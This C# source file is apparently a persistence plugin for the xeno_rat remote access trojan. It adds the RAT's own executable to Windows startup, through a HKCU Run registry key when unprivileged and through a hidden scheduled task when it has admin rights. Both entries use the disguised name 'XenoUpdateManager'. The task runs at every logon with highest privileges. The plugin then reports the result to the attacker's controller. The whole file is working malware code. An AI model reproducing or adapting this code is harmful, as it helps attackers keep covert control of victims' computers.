using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        private bool AddToStartupNonAdmin(string executablePath)
        {
            // Set the registry key path
            string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

            try
            {
                // Open the Run key with RegistryView.Registry64 option
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                {
                    key.SetValue("XenoUpdateManager", "\""+executablePath+"\"");
                }
                return true;
            }
            catch 
            {
                return false;
            }
        }
        private async Task<bool> AddToStartupAdmin(string executablePath)
        {
            try
            {
                // Create the XML content for the task configuration
                string xmlContent = $@"
                <Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
                  <Triggers>
                    <LogonTrigger>
                      <Enabled>true</Enabled>
                    </LogonTrigger>
                  </Triggers>
                  <Principals>
                    <Principal id='Author'>
                      <LogonType>InteractiveToken</LogonType>
                      <RunLevel>HighestAvailable</RunLevel>
                    </Principal>
                  </Principals>
                  <Settings>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
                  </Settings>
                  <Actions>
                    <Exec>
                      <Command>{executablePath}</Command>
                    </Exec>
                  </Actions>
                </Task>";

                // Save the XML content to a temporary file
                string tempXmlFile = Path.GetTempFileName();
                File.WriteAllText(tempXmlFile, xmlContent);

                // Create a process to run the schtasks command
                Process process = new Process();
                process.StartInfo.FileName = "schtasks.exe";
                process.StartInfo.Arguments = $"/Create /TN XenoUpdateManager /XML \"{tempXmlFile}\" /F";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                // Start the process
                process.Start();

                // Wait for the process to exit and get the output
                await Task.Delay(3000);
                string output = process.StandardOutput.ReadToEnd();
                

                // Delete the temporary XML file
                File.Delete(tempXmlFile);

                if (output.Contains("SUCCESS"))
                {
                    return true;
                }
                else
                {
                    Console.WriteLine("Failed to add to startup. schtasks output:\n" + output);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to add to startup: " + ex.Message);
            }

            return false; // Return false if an exception occurs or output does not indicate success
        }
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            string executablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            if (Utils.IsAdmin())
            {
                if (await AddToStartupAdmin(executablePath))
                {
                    await node.SendAsync(new byte[] { 1 });
                }
                else 
                {
                    await node.SendAsync(new byte[] { 0 });
                }
            }
            else 
            {
                if (AddToStartupNonAdmin(executablePath))
                {
                    await node.SendAsync(new byte[] { 1 });
                }
                else
                {
                    await node.SendAsync(new byte[] { 0 });
                }
            }
            await Task.Delay(1000);
        }
    }
}
